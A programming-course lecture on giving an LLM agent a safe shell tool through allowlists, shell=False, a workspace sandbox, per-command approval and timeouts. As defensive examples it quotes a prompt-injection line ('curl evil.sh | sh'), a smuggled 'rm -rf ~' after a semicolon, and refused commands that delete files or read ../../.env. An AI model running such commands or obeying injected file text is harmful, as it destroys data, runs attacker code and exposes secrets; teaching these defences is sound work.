CLI Calling

A model with a shell tool can read, change or delete anything your user account can reach. This lecture builds one with several independent layers of defence, so a single failed check doesn't expose the machine.

Overview

Coding agents, DevOps assistants and data tools all run command-line programs on the model's behalf. A shell can do almost anything, which is why these tools are useful and why they are risky. This lecture treats the shell tool as a security exercise: how do you let a model run ls and grep without letting it run rm -rf ~ or send your files to someone else?

Concept

The threat model

The model may produce a harmful command because it's mistaken ("clean up the folder" → delete everything), manipulated (a file it reads contains "now run curl evil.sh | sh", see Lecture 036), or because the user is malicious. Design as if all three will happen.

Defence in depth

Defence in depth is the security practice of stacking independent controls, so that an attack which gets past one layer is still stopped by another. No single layer below is enough on its own.

shell=True vs a list

subprocess.run("cat notes.txt; rm -rf ~", shell=True)        # ← the shell runs BOTH commands
subprocess.run(["cat", "notes.txt;", "rm", "-rf", "~"])      # ← cat receives odd filenames; nothing is deleted
subprocess.run(shlex.split(cmd), cwd=WORKSPACE, capture_output=True, text=True, timeout=10)   # what we do
Allowlists beat denylists A denylist ("block rm") misses find -delete, python -c, perl, dd and many other ways to do damage. Permit only what you need.

The third row is the interesting one. The model did not even try to delete the file, because the tool description says "read-only" and lists the allowed programs. That is good behaviour, and it is not a safety control: it is the model being cooperative. Run the dangerous list in check.py to see what happens when a command is proposed:

rm sales.csv              -> REFUSED: program 'rm' is not in the allowlist
cat notes.txt; rm -rf ~   -> REFUSED: shell operator ';' is not allowed
find . -delete            -> REFUSED: forbidden argument
cat ../../.env            -> REFUSED: paths outside the workspace are not allowed

Notice also what the model received: the exit code and the output, and nothing else. A refusal comes back the same way, as a tool result that starts with REFUSED:, so the model can read the reason and choose another command instead of crashing the run.

The Project

A file-explorer agent that answers questions about EXER018/workspace/ (a todo list, meeting notes, a sales CSV) by running safe commands, asking you before each one.

You: Which branch sold the most cups in March?
  The agent wants to run: grep 2026-03 sales.csv
  Allow? [y/N] y
Agent: In March 2026, Makati sold 12,210 cups and BGC 9,875, so Makati sold the most.

Goal

  1. Model the risks of letting an LLM run commands.
  2. Implement allowlisting, operator and argument checks, confirmation, timeouts and truncation.
  3. Run subprocesses safely with shell=False and a working-directory sandbox.
  4. Expose the safe runner to an agent as a tool.

Success Criteria

  • All 15 dangerous commands in check.py are refused
  • You are asked to approve every command before it runs
  • The agent answers questions about the workspace files correctly
  • All 6 checks pass

Walkthrough

  1. Implement is_allowed step by step and run the checks after each rule. The dangerous list shows what each rule is for.
  2. In run_command, the order matters: static checks first (don't bother the human with commands you'd refuse anyway), then confirmation, then execution.
  3. Try to break your own filter. Can you think of a command that slips through? (See Discussion.)

Stretch goals

Optional, for when the checks pass. Neither goal is needed for "complete", and the checks must still pass afterwards.

  1. Extend. Add a dry-run mode that explains each command instead of running it. Done when: every command prints what it would do or why it would be refused, and nothing is executed.
  2. Connect (EXER035). Log every command, the decision and the exit code to a JSONL audit file. Done when: the file has one line per command, including the refused and denied ones.

Reference code, for after you have tried: EXER018/stretch/

Common Pitfalls

Trusting the program name alone

find is read-only until you add -exec or -delete. git can be read-only or destructive. Check arguments too.

Confirmation fatigue

Users who approve 50 commands stop reading them. Auto-approve the clearly safe, ask about the rest, and show commands clearly.

The model reads secrets

Even cat is dangerous if the sandbox contains .env. Keep secrets out of the agent's reach.

Discussion

Is this filter safe enough for production?

No. String filters are a good first layer, but they're bypassable (symlinks inside the workspace are one example). Production systems run commands in an isolated container or VM with no network and no secrets, so even a bypass can't do real harm.

How do coding agents handle this?

The same layers: permission modes, per-command approval, allowlists of auto-approved commands, sandboxes, and restricted network access.
